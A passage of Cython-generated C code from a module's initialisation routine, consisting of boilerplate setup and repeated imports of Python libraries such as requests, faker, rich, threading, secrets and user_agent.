  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 5, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 5, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_user_agent_2, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_user_agent_2, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_faker, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_faker, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_render);
  __Pyx_GIVEREF(__pyx_n_s_render);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_render);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_cfonts, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_render); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_render, __pyx_t_1) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_webbrowser, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_webbrowser, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_post);
  __Pyx_GIVEREF(__pyx_n_s_post);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_post);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_post, __pyx_t_2) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_token_hex);
  __Pyx_GIVEREF(__pyx_n_s_token_hex);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_token_hex);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_secrets, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_token_hex); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_token_hex, __pyx_t_1) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_concurrent_futures, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_concurrent, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_rich, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_rich, __pyx_t_2) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_secrets, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_secrets, __pyx_t_2) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Text);
  __Pyx_GIVEREF(__pyx_n_s_Text);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Text);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_rich_text, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Text); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Text, __pyx_t_2) < 0) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_Console);
  __Pyx_GIVEREF(__pyx_n_s_Console);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Console);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_rich_console, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Console); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Console, __pyx_t_1) < 0) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Lock);
  __Pyx_GIVEREF(__pyx_n_s_Lock);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Lock);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_threading, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Lock); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Lock, __pyx_t_2) < 0) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_datetime);
  __Pyx_GIVEREF(__pyx_n_s_datetime);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_datetime);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_datetime, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_1) < 0) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_threading, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_threading, __pyx_t_2) < 0) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_2) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_2) < 0) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_2) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_generate_user_agent);
  __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_generate_user_agent);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_generate_user_agent, __pyx_t_2) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_1) < 0) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_datetime, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_1) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_1) < 0) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_get);
  __Pyx_GIVEREF(__pyx_n_s_get);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_get);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get, __pyx_t_1) < 0) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_choice);
  __Pyx_GIVEREF(__pyx_n_s_choice);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_choice);
  __Pyx_INCREF(__pyx_n_s_randrange);
  __Pyx_GIVEREF(__pyx_n_s_randrange);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_n_s_randrange);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_choice, __pyx_t_2) < 0) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_randrange); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_randrange, __pyx_t_2) < 0) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_Thread);
  __Pyx_GIVEREF(__pyx_n_s_Thread);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Thread);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_threading, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Thread); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Thread, __pyx_t_1) < 0) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_2) < 0) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_time);
  __Pyx_GIVEREF(__pyx_n_s_time);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_time);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_time); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_2) < 0) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_md5);
  __Pyx_GIVEREF(__pyx_n_s_md5);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_md5);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_hashlib, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_md5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_md5, __pyx_t_1) < 0) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_generate_user_agent);
  __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_generate_user_agent);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_generate_user_agent, __pyx_t_2) < 0) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_randrange);
  __Pyx_GIVEREF(__pyx_n_s_randrange);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_randrange);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_random, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_randrange, __pyx_t_1) < 0) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Thread);
  __Pyx_GIVEREF(__pyx_n_s_Thread);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Thread);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_threading, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Thread); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
